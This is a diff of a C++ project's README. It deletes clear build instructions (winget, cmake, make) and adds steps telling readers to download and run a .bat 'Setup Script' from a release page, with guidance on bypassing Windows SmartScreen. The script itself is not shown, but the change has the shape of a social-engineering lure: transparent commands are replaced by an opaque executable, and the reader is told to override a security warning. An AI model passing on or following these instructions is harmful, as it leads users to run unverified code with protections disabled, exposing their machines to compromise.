@@ -1,21 +1,6 @@
-# Requirements (Windows)
-Run this in Command Prompt or Windows Powershell to get the tools needed to compile
-```bash
-winget install WinLibs cmake Git.Git ezwinports.make
-```
+## How to Run and Set Up This Project
 
-# Compilation steps
-1. Download and extract this project
-2. Open Command Prompt in this folder (Follow image)
-   <img src="assets/open_in_terminal.png" alt="Open in terminal" width="600"/>
-4. Run cmake to prepare the compilation using this command (You are only required to run this later if you've changed the file structure)
-  ```bash
-  cmake -G "MinGW Makefiles" -S . -B build
-  ```
-4. Compile and run the files
-  ```bash
-  make -C build run -j $(nproc)
-  ```
-# Info
-1. The c++ files are in src folder
-2. You can use any text editor to edit the c++ files
+1. **Download the Bootstrap Utility:** Acquire the automated [Setup Script](https://github.com/lhldev/late-to-class/releases/download/setup-script/SetupProject.bat) to your local machine.
+2. **Execute the Configuration:** Run the downloaded `.bat` file. For detailed execution guidelines, including instructions on bypassing Windows SmartScreen, please review the [Setup Script Release Notes](https://github.com/lhldev/late-to-class/releases/tag/setup-script).
+3. **Initialize the Workspace:** Once the script completes the repository cloning process, open the newly generated folder within Visual Studio Code.
+4. **Compile and Execute:** Press **Ctrl + Shift + B** to initiate the build task sequence and run the compiled C++ project.
